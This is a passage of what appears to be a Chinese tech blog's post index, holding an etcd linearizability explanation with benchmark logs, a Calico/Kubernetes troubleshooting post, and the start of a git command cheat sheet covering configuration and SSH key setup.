loosely synchronized global clock. Operations are linearized if and only if they always complete as though they were executed in a sequential order and each operation appears to complete in the order specified by the program. Likewise, if an operation’s timestamp precedes another, that operation must also precede the other operation in the sequence.\nFor example, consider a client completing a write at time point 1 (t1). A client issuing a read at t2 (for t2 \u0026gt; t1) should receive a value at least as recent as the previous write, completed at t1. However, the read might actually complete only by t3. Linearizability guarantees the read returns the most current value. Without linearizability guarantee, the returned value, current at t2 when the read began, might be \u0026ldquo;stale\u0026rdquo; by t3 because a concurrent write might happen between t2 and t3.\netcd does not ensure linearizability for watch operations. Users are expected to verify the revision of watch responses to ensure correct ordering.\netcd ensures linearizability for all other operations by default. Linearizability comes with a cost, however, because linearized requests must go through the Raft consensus process. To obtain lower latencies and higher throughput for read requests, clients can configure a request’s consistency mode to serializable, which may access stale data with respect to quorum, but removes the performance penalty of linearized accesses' reliance on live consensus.\n线性化（也称为原子一致性或外部一致性）是严格一致性和顺序一致性之间的一致性级别。\n对于线性化，假设每个操作从松散同步的全局时钟接收一个时间戳。当且仅当操作总是像按顺序执行一样完成，并且每个操作似乎按程序指定的顺序完成时，才线性化操作。同样，如果一个操作的时间戳先于另一个操作，那么该操作也必须先于序列中的另一个操作。\n例如，假设客户机在时间点1（t1）完成写入。在t2发出read（对于t2\u0026gt;t1）的客户机应至少收到与在t1完成的上一次写入相同的最新值。然而，读取实际上可能只在t3之前完成。线性化保证读取返回最新值。如果没有线性化保证，返回值（读取开始时t2处的当前值）可能会被t3“过时”，因为t2和t3之间可能发生并发写入。\netcd不能确保监视操作的线性化。用户需要验证监视响应的修订，以确保正确排序。\n默认情况下，etcd可确保所有其他操作的线性化。然而，线性化是有代价的，因为线性化的请求必须经过协商一致的过程。为了获得较低的延迟和较高的读请求吞吐量，客户机可以将请求的一致性模式配置为可串行化，这可能会访问有关仲裁的过时数据，但消除了线性化访问依赖实时一致性的性能损失。\n测试记录 write测试 表格第1行测试数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  (base) [root@yuyuan211 /home/wangb/etcd-test]# benchmark --endpoints=${HOST_1} --target-leader --conns=1 --clients=1 \\ \u0026gt; put --key-size=8 --sequential-keys --total=10000 --val-size=256 10000 / 10000 Booooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo! 100.00% 7s Summary: Total: 7.3535 secs. Slowest: 0.0048 secs. Fastest: 0.0003 secs. Average: 0.0007 secs. Stddev: 0.0003 secs. Requests/sec: 1359.9057 Response time histogram: 0.0003 [1] | 0.0008 [7950] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0012 [1535] |∎∎∎∎∎∎∎ 0.0016 [240] |∎ 0.0021 [152] | 0.0025 [53] | 0.0030 [33] | 0.0034 [20] | 0.0039 [10] | 0.0043 [3] | 0.0048 [3] | Latency distribution: 10% in 0.0006 secs. 25% in 0.0006 secs. 50% in 0.0006 secs. 75% in 0.0007 secs. 90% in 0.0010 secs. 95% in 0.0012 secs. 99% in 0.0022 secs. 99.9% in 0.0037 secs. (base) [root@yuyuan211 /home/wangb/etcd-test]# (base) [root@yuyuan211 /home/wangb/etcd-test]# ps aux |grep etcd root 29017 1.9 0.0 10616300 24752 pts/10 Sl+ 13:46 0:14 /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000   表格第2行测试数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  (base) [root@yuyuan211 /home/wangb/etcd-test]# benchmark --endpoints=${HOST_1} --target-leader --conns=100 --clients=1000 \\ \u0026gt; put --key-size=8 --sequential-keys --total=100000 --val-size=256 INFO: 2021/01/18 14:00:00 parsed scheme: \u0026#34;endpoint\u0026#34; INFO: 2021/01/18 14:00:00 ccResolverWrapper: sending new addresses to cc: [{http://localhost:2379 \u0026lt;nil\u0026gt; 0 \u0026lt;nil\u0026gt;}] 100000 / 100000 Booooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo! 100.00% 3s Summary: Total: 3.5391 secs. Slowest: 0.0837 secs. Fastest: 0.0035 secs. Average: 0.0351 secs. Stddev: 0.0109 secs. Requests/sec: 28255.6626 Response time histogram: 0.0035 [1] | 0.0116 [1] | 0.0196 [1298] |∎ 0.0276 [25892] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0356 [34394] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0436 [15557] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0517 [14631] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0597 [5577] |∎∎∎∎∎∎ 0.0677 [1873] |∎∎ 0.0757 [428] | 0.0837 [348] | Latency distribution: 10% in 0.0235 secs. 25% in 0.0272 secs. 50% in 0.0318 secs. 75% in 0.0424 secs. 90% in 0.0504 secs. 95% in 0.0550 secs. 99% in 0.0665 secs. 99.9% in 0.0812 secs. (base) [root@yuyuan211 /home/wangb/etcd-test]# (base) [root@yuyuan211 /home/wangb/etcd-test]# ps aux |grep etcd root 29017 6.6 0.2 10687728 75552 pts/10 Sl+ 13:46 0:56 /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000   表格第3行测试数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  (base) [root@yuyuan211 /home/wangb/etcd-test]# benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\ \u0026gt; put --key-size=8 --sequential-keys --total=100000 --val-size=256 INFO: 2021/01/18 14:11:16 ccResolverWrapper: sending new addresses to cc: [{http://127.0.0.1:2379 \u0026lt;nil\u0026gt; 0 \u0026lt;nil\u0026gt;}] 100000 / 100000 Booooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo! 100.00% 3s Summary: Total: 3.5622 secs. Slowest: 0.0836 secs. Fastest: 0.0123 secs. Average: 0.0353 secs. Stddev: 0.0109 secs. Requests/sec: 28072.8070 Response time histogram: 0.0123 [1] | 0.0194 [1105] |∎ 0.0266 [23001] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0337 [30319] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0408 [13738] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0480 [17523] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0551 [9420] |∎∎∎∎∎∎∎∎∎∎∎∎ 0.0622 [3625] |∎∎∎∎ 0.0693 [506] | 0.0765 [597] | 0.0836 [165] | Latency distribution: 10% in 0.0235 secs. 25% in 0.0268 secs. 50% in 0.0319 secs. 75% in 0.0437 secs. 90% in 0.0501 secs. 95% in 0.0548 secs. 99% in 0.0649 secs. 99.9% in 0.0791 secs. (base) [root@yuyuan211 /home/wangb/etcd-test]# ps aux |grep etcd root 29017 6.2 0.2 10687728 89612 pts/10 Sl+ 13:46 1:41 /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000   read测试 测试数据 Single connection read requests\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72  (base) [root@yuyuan211 /home/wangb/etcd-test]# # Single connection read requests (base) [root@yuyuan211 /home/wangb/etcd-test]# benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=1 --clients=1 \\ \u0026gt; range $YOUR_KEY --consistency=l --total=10000 bench with linearizable range 10000 / 10000 Booooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo! 100.00% 9s Summary: Total: 9.0010 secs. Slowest: 0.0064 secs. Fastest: 0.0004 secs. Average: 0.0009 secs. Stddev: 0.0005 secs. Requests/sec: 1110.9827 Response time histogram: 0.0004 [1] | 0.0010 [9102] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0016 [432] |∎ 0.0022 [76] | 0.0028 [144] | 0.0034 [101] | 0.0040 [54] | 0.0046 [36] | 0.0052 [29] | 0.0058 [21] | 0.0064 [4] | Latency distribution: 10% in 0.0007 secs. 25% in 0.0007 secs. 50% in 0.0008 secs. 75% in 0.0008 secs. 90% in 0.0009 secs. 95% in 0.0014 secs. 99% in 0.0039 secs. 99.9% in 0.0055 secs. (base) [root@yuyuan211 /home/wangb/etcd-test]# benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=1 --clients=1 \\ \u0026gt; range $YOUR_KEY --consistency=s --total=10000 bench with serializable range 10000 / 10000 Booooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo! 100.00% 7s Summary: Total: 7.9876 secs. Slowest: 0.0095 secs. Fastest: 0.0004 secs. Average: 0.0008 secs. Stddev: 0.0005 secs. Requests/sec: 1251.9368 Response time histogram: 0.0004 [1] | 0.0013 [9485] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.0022 [161] | 0.0031 [207] | 0.0040 [83] | 0.0050 [48] | 0.0059 [11] | 0.0068 [3] | 0.0077 [0] | 0.0086 [0] | 0.0095 [1] | Latency distribution: 10% in 0.0006 secs. 25% in 0.0006 secs. 50% in 0.0007 secs. 75% in 0.0007 secs. 90% in 0.0008 secs. 95% in 0.0014 secs. 99% in 0.0037 secs. 99.9% in 0.0054 secs. (base) [root@yuyuan211 /home/wangb/etcd-test]#   测试数据 Many concurrent read requests\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83  (base) [root@yuyuan211 /home/wangb/etcd-test]# # Many concurrent read requests (base) [root@yuyuan211 /home/wangb/etcd-test]# benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\ \u0026gt; range $YOUR_KEY --consistency=l --total=100000 bench with linearizable range INFO: 2021/01/18 14:54:38 parsed scheme: \u0026#34;endpoint\u0026#34; INFO: 2021/01/18 14:54:38 ccResolverWrapper: sending new addresses to cc: [{http://127.0.0.1:2379 \u0026lt;nil\u0026gt; 0 \u0026lt;nil\u0026gt;}] 100000 / 100000 Boooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo! 100.00% 10s Summary: Total: 10.4905 secs. Slowest: 1.1881 secs. Fastest: 0.0004 secs. Average: 0.1044 secs. Stddev: 0.1186 secs. Requests/sec: 9532.4514 Response time histogram: 0.0004 [1] | 0.1192 [67345] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.2380 [21111] |∎∎∎∎∎∎∎∎∎∎∎∎ 0.3567 [6188] |∎∎∎ 0.4755 [3418] |∎∎ 0.5943 [1527] | 0.7130 [232] | 0.8318 [123] | 0.9505 [48] | 1.0693 [5] | 1.1881 [2] | Latency distribution: 10% in 0.0074 secs. 25% in 0.0189 secs. 50% in 0.0634 secs. 75% in 0.1471 secs. 90% in 0.2604 secs. 95% in 0.3664 secs. 99% in 0.5222 secs. 99.9% in 0.7631 secs. (base) [root@yuyuan211 /home/wangb/etcd-test]# benchmark --endpoints=${HOST_1},${HOST_2},${HOST_3} --conns=100 --clients=1000 \\ \u0026gt; range $YOUR_KEY --consistency=s --total=100000 bench with serializable range INFO: 2021/01/18 14:54:49 parsed scheme: \u0026#34;endpoint\u0026#34; INFO: 2021/01/18 14:54:49 ccResolverWrapper: sending new addresses to cc: [{http://127.0.0.1:2379 \u0026lt;nil\u0026gt; 0 \u0026lt;nil\u0026gt;}] 100000 / 100000 Booooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo! 100.00% 8s Summary: Total: 8.8068 secs. Slowest: 1.0424 secs. Fastest: 0.0005 secs. Average: 0.0875 secs. Stddev: 0.0995 secs. Requests/sec: 11354.9122 Response time histogram: 0.0005 [1] | 0.1047 [67942] |∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎ 0.2089 [21128] |∎∎∎∎∎∎∎∎∎∎∎∎ 0.3131 [7264] |∎∎∎∎ 0.4172 [2300] |∎ 0.5214 [797] | 0.6256 [367] | 0.7298 [154] | 0.8340 [33] | 0.9382 [12] | 1.0424 [2] | Latency distribution: 10% in 0.0052 secs. 25% in 0.0137 secs. 50% in 0.0518 secs. 75% in 0.1290 secs. 90% in 0.2170 secs. 95% in 0.2829 secs. 99% in 0.4543 secs. 99.9% in 0.6792 secs.   read测试时的etcd打印信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  09072ms) to execute 2021-01-18 14:54:58.315985 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (128.237385ms) to execute 2021-01-18 14:54:58.316748 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (136.434995ms) to execute 2021-01-18 14:54:58.317021 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (125.138823ms) to execute 2021-01-18 14:54:58.327063 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (113.659252ms) to execute 2021-01-18 14:54:58.327171 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (140.480071ms) to execute 2021-01-18 14:54:58.328320 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (138.142424ms) to execute 2021-01-18 14:54:58.329457 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (136.980041ms) to execute 2021-01-18 14:54:58.330026 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (139.674614ms) to execute 2021-01-18 14:54:58.330674 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (137.950461ms) to execute 2021-01-18 14:54:58.330710 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (151.589201ms) to execute 2021-01-18 14:54:58.338877 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (149.623303ms) to execute 2021-01-18 14:54:58.339042 W | etcdserver: read-only range request \u0026#34;key:\\\u0026#34;foo\\\u0026#34; serializable:true \u0026#34; with result \u0026#34;range_response_count:1 size:30\u0026#34; took too long (148.882374ms) to execute   ","permalink":"http://bingerambo.com/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/","tags":["Etcd"],"title":"Etcd调优和性能测试"},{"categories":["K8S"],"contents":"K8S calico网络插件问题集，持续更新\ncalico node pod一直没有起来 Number of node(s) with BGP peering established = 0\n网上解决方法如下： https://blog.csdn.net/qq_36783142/article/details/107912407\n name: IP_AUTODETECTION_METHOD value: \u0026ldquo;interface=enp26s0f3\u0026rdquo; 但此方式不能解决自己环境所遇问题。 分析应该是网络路由问题（原来环境残留的脏路由导致），做下清理处理  执行下面命令解决\n1 2 3 4 5 6  systemctl stop kubelet systemctl stop docker iptables --flush iptables -tnat --flush systemctl start docker systemctl start kubelet   calico node pod异常 Readiness probe failed: container is not running\n现象如下\n1 2 3 4 5  [root@node2 ~]# kubectl get po -A -owide NAMESPACE NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES kube-system calico-kube-controllers-67f55f8858-5cgpg 1/1 Running 2 14d 10.151.11.53 gpu53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-l6crs 0/1 Running 3 18d 10.151.11.61 node2 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; kube-system calico-node-vb7s5 0/1 Running 1 57m 10.151.11.53 gpu53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt;   calico node 异常现象跟上面类似，但是探针检查失败\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning Unhealthy 69m (x2936 over 12d) kubelet Readiness probe errored: rpc error: code = Unknown desc = operation timeout: context deadline exceeded Warning Unhealthy 57m (x2938 over 12d) kubelet Liveness probe errored: rpc error: code = Unknown desc = operation timeout: context deadline exceeded Warning Unhealthy 12m (x6 over 13m) kubelet Liveness probe failed: container is not running Normal SandboxChanged 11m (x2 over 13m) kubelet Pod sandbox changed, it will be killed and re-created. Normal Killing 11m (x2 over 13m) kubelet Stopping container calico-node Warning Unhealthy 8m3s (x32 over 13m) kubelet Readiness probe failed: container is not running Warning Unhealthy 4m45s (x6 over 5m35s) kubelet Liveness probe failed: container is not running Normal SandboxChanged 3m42s (x2 over 5m42s) kubelet Pod sandbox changed, it will be killed and re-created. Normal Killing 3m42s (x2 over 5m42s) kubelet Stopping container calico-node Warning Unhealthy 42s (x31 over 5m42s) kubelet Readiness probe failed: container is not running   查看异常pod日志信息，发现进程端口被占用。通过netstat命令查看端口占用进程，发现下面进程一直残留\n删除calico-node组件，包括kill，上面进程仍然残留\n1 2 3  # 删除calico-node组件 cd /etc/kubernetes/ kubectl delete -f calico-node.yml   这些进程为docker启动，但未回收，此时21881进程状态为D - 不可中断的睡眠状态。\n通过重启服务器节点，解除calico服务端口占用。问题解决。\n有时进程可以进行删除，如下残留进程/usr/local/bin/runsvdir -P /etc/service/enabled，状态为S，其子进程包含了calico相关服务，通过kill命令清理，然后再启动calico-node组件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  [root@node2 kubernetes]# ps -ef |grep 175885 root 24910 36399 0 16:04 pts/6 00:00:00 grep --color=auto 175885 root 175885 175862 0 15:12 ? 00:00:00 /usr/local/bin/runsvdir -P /etc/service/enabled root 201783 175885 0 15:29 ? 00:00:00 runsv felix root 201784 175885 0 15:29 ? 00:00:00 runsv monitor-addresses root 201785 175885 0 15:29 ? 00:00:00 runsv allocate-tunnel-addrs root 201786 175885 0 15:29 ? 00:00:00 runsv bird root 201787 175885 0 15:29 ? 00:00:00 runsv bird6 root 201788 175885 0 15:29 ? 00:00:00 runsv confd [root@node2 kubernetes]# ps aux |grep 175885 root 25633 0.0 0.0 112712 960 pts/6 S+ 16:05 0:00 grep --color=auto 175885 root 175885 0.0 0.0 4356 372 ? Ss 15:12 0:00 /usr/local/bin/runsvdir -P /etc/service/enabled [root@node2 kubernetes]# [root@node2 kubernetes]# [root@node2 kubernetes]# kill 175885 [root@node2 kubernetes]# [root@node2 kubernetes]# [root@node2 kubernetes]# ps -ef |grep calico root 33242 36399 0 16:11 pts/6 00:00:00 grep --color=auto calico [root@node2 kubernetes]# [root@node2 kubernetes]#   所以删除calico-node组件时，需要通过ps -ef |grep calico确认节点上是否还有calico相关进程\n1 2 3 4 5 6 7 8 9 10  [root@node2 net.d]# [root@node2 net.d]# ps -ef |grep calico root 57982 18990 0 10:54 pts/8 00:00:00 grep --color=auto calico root 219142 219137 0 2020 ? 00:01:11 calico-node -allocate-tunnel-addrs root 219143 219135 0 2020 ? 02:25:07 calico-node -felix root 219144 219136 0 2020 ? 00:01:51 calico-node -monitor-addresses root 219145 219140 0 2020 ? 00:01:13 calico-node -confd root 219407 219138 0 2020 ? 00:11:20 bird -R -s /var/run/calico/bird.ctl -d -c /etc/calico/confd/config/bird.cfg root 219408 219139 0 2020 ? 00:10:59 bird6 -R -s /var/run/calico/bird6.ctl -d -c /etc/calico/confd/config/bird6.cfg   附录 检查当前节点的calico网络状态 1  calicoctl node status   calico网络成功配置示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  [root@node2 kubernetes]# calicoctl node status Calico process is running. IPv4 BGP status +--------------+-------------------+-------+----------+-------------+ | PEER ADDRESS | PEER TYPE | STATE | SINCE | INFO | +--------------+-------------------+-------+----------+-------------+ | 192.168.1.11 | node-to-node mesh | up | 08:13:23 | Established | +--------------+-------------------+-------+----------+-------------+ IPv6 BGP status No IPv6 peers found.   获取k8s node命令 1 2 3  # run in master node DATASTORE_TYPE=kubernetes KUBECONFIG=~/.kube/config calicoctl get nodes   示例\n1 2 3 4 5  [root@node2 kubernetes]# DATASTORE_TYPE=kubernetes KUBECONFIG=~/.kube/config calicoctl get nodes NAME gpu53 node2   获取ipPool命令 1 2 3  # run in master node DATASTORE_TYPE=kubernetes KUBECONFIG=~/.kube/config calicoctl get ipPool -o yaml   示例\n1 2 3 4 5 6  [root@node2 kubernetes]# DATASTORE_TYPE=kubernetes KUBECONFIG=~/.kube/config calicoctl get ipPool -o yaml apiVersion: projectcalico.org/v3 items: [] kind: IPPoolList metadata: {}   ","permalink":"http://bingerambo.com/posts/2021/01/k8s-calico%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98%E9%9B%86/","tags":["K8S"],"title":"K8S calico网络插件问题集"},{"categories":["开发"],"contents":"[转载]这里是我的笔记，记录一些 git 常用和一些记不住的命令，这个笔记原本是基于 颜海镜的文章增加的，后面慢慢增加了许多内容，独立一个仓库维护，方便查询和使用。\n目录  安装卸载 配置管理 不常见的使用场景  忽略文件的权限变化 设置大小写敏感 配置自动换行 创建SSH密钥 多账号ssh配置 免密码登录远程服务器 https协议下提交代码免密码 文件推向3个git库 修改远程仓库地址 撤销远程记录 放弃本地的文件修改 最简单放弃本地修改内容 回退到某一个版本 搜索 commit 历史记录 回滚到某个commit提交 去掉某个commit 把 A 分支的某一个 commit，放到 B 分支上 获取最近一次提交的 commit id 两个 git 仓库合并 合并多个commit 修改远程Commit记录 利用commit关闭一个issue 新建一个空分支 添加忽略文件 忽略某个文件的改动 同步fork的上游仓库 手动合并冲突的 Pull Request 修改作者名 批量修改历史commit中的名字和邮箱 查看两个星期内的改动 查看某个文件历史 查看git仓库中最近修改的分支 更新所有本地分支 打造自己的git命令 删除已经合并到 master 的分支 中文乱码的解决方案 提交一个空文件夹   新建仓库  init status add commit remote push   clone 本地  help add rm commit reset revert checkout diff stash merge cherry-pick rebase   分支branch  删除 提交 拉取 分支合并 重命名 查看 新建 连接 分支切换   远端 submodule  更新 submodule 删除 submodule 转换分支   删除文件 remote 标签tag  重命名Tag   日志log 重写历史 其它 报错问题解决 参考资料  安装卸载 官方教程，在 Linux/Unix 系统中，通过工具在中安装 git,这种方式比较简单，便于升级卸载工具。\n下面介绍在 CentOS 系统中，通过 yum 来安装 git\n Red Hat Enterprise Linux, Oracle Linux, CentOS, Scientific Linux, et al. RHEL and derivatives typically ship older versions of git. You can download a tarball and build from source, or use a 3rd-party repository such as the IUS Community Project to obtain a more recent version of git.\n 官方文档说 git 在 RHEL 和衍生产品通常都会发布旧版本的 git，我们需要源码编译安装，或者使用第三方存储库（如IUS社区项目）。\n现在我们通过，IUS社区下载 ius-release.rpm 文件进行安装\n1 2 3 4  # 注意下载不同的版本，本机 CentOS 7 wget https://centos7.iuscommunity.org/ius-release.rpm # 安装rpm文件 rpm -ivh ius-release.rpm   查看可安装的git安装包\n1 2 3 4 5 6  repoquery --whatprovides git # git-0:1.8.3.1-13.el7.x86_64 # git2u-0:2.16.5-1.ius.centos7.x86_64 # git2u-0:2.16.2-1.ius.centos7.x86_64 # git2u-0:2.16.4-1.ius.centos7.x86_64 # git-0:1.8.3.1-14.el7_5.x86_64   yum 卸载 git 安装新版本\n卸载 1.8.3 的 git，安装 2.16.5 的 git\n1 2 3 4  # 卸载老的版本 yum remove git # 安装新的版本 yum install git2u   配置管理 首先是配置帐号信息 ssh -T git@github.com 测试。\n1 2 3 4 5  git help config # 获取帮助信息，查看修改个人信息的参数  git config --list # 查看配置的信息 git config --global user.name \u0026#34;小弟调调\u0026#34; # 修改全局名字 git config --global user.email \u0026#34;wowohoo@qq.com\u0026#34; # 修改全局邮箱 git config --global --unset \u0026lt;entry-name\u0026gt; # 删除全局设置   不常见的使用场景 忽略文件的权限变化 不再将文件的权限变化视作改动\n1  git config core.fileMode false   设置大小写敏感 1 2 3  git config --get core.ignorecase # 查看git 的设置 git config core.ignorecase false # 设置大小写敏感 git rm -r --cached \u0026lt;目录/文件\u0026gt; # 远程有俩相同目录，通过这种方式清除掉，然后提交记录   配置自动换行 自动转换坑太大，提交到git是自动将换行符转换为lf\n1  git config --global core.autocrlf input   创建SSH密钥 这个密钥用来跟 github 通信，在本地终端里生成然后上传到 github\n1 2 3  ssh-keygen -t rsa -C \u0026#39;wowohoo@qq.com\u0026#39; # 生成密钥  ssh-keygen -t rsa -C \u0026#34;wowohoo@qq.com\u0026#34; -f ~/.ssh/ww_rsa # 指定生成目录文件名字 ssh -T git@github.com # 测试是否成功    多账号ssh配置 1.生成指定名字的密钥\nssh-keygen -t rsa -C \u0026quot;邮箱地址\u0026quot; -f ~/.ssh/jslite_rsa\n会生成 jslite_rsa 和 jslite_rsa.pub 这两个文件\n2.密钥复制到托管平台上\nvim ~/.ssh/jslite_rsa.pub\n打开公钥文件 jslite_rsa.pub ，并把内容复制至代码托管平台上\n3.修改config文件\nvim ~/.ssh/config #修改config文件，如果没有创建 config\n1 2 3 4 5 6 7 8 9 10 11 12  Host jslite.github.com HostName github.com User git IdentityFile ~/.ssh/jslite_rsa Host work.github.com HostName github.com # Port 服务器open-ssh端口（默认：22,默认时一般不写此行） # PreferredAuthentications 配置登录时用什么权限认证  # publickey|password publickey|keyboard-interactive等 User git IdentityFile ~/.ssh/work_rsa    Host 这里是个别名可以随便命名 HostName 一般是网站如：git@ss.github.com:username/repo.git 填写 github.com User 通常填写git IdentityFile 使用的公钥文件地址  4.测试\n1 2 3  ssh -T git@jslite.github.com # `@`后面跟上定义的Host  ssh -T work.github.com # 通过别名测试 ssh -i ~/公钥文件地址 Host别名 # 如 ssh -i ~/.ssh/work_rsa work.github.com   5.使用\n1 2 3 4 5  # 原来的写法 git clone git@github.com:\u0026lt;jslite的用户名\u0026gt;/learngit.git # 现在的写法 git clone git@jslite.github.com:\u0026lt;jslite的用户名\u0026gt;/learngit.git git clone git@work.github.com:\u0026lt;work的用户名\u0026gt;/learngit.git   5.注意\n如果你修改了id_rsa的名字，你需要将ssh key添加到SSH agent中，如：\n1 2 3 4  ssh-add ~/.ssh/jslite_rsa ssh-add -l # 查看所有的key ssh-add -D # 删除所有的key ssh-add -d ~/.ssh/jslite_rsa # 删除指定的key   免密码登录远程服务器 1 2  $ ssh-keygen -t rsa -P \u0026#39;\u0026#39; -f ~/.ssh/aliyunserver.key $ ssh-copy-id -i ~/.ssh/aliyunserver.key.pub root@192.168.182.112 # 这里需要输入密码一次   编辑 ~/.ssh/config\n1 2 3 4 5  Host aliyun1 HostName 192.168.182.112 User root PreferredAuthentications publickey IdentityFile ~/.ssh/aliyunserver.key   上面配置完了，可以通过命令登录，不需要输入IP地址和密码 ssh aliyun1\nhttps协议下提交代码免密码 1  git clone https://github.com/username/rep.git   通过上面方式克隆可能需要密码，解决办法：进入当前克隆的项目 vi rep/.git/config 编辑 config, 按照下面方式修改，你就可以提交代码不用输入密码了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true ignorecase = true 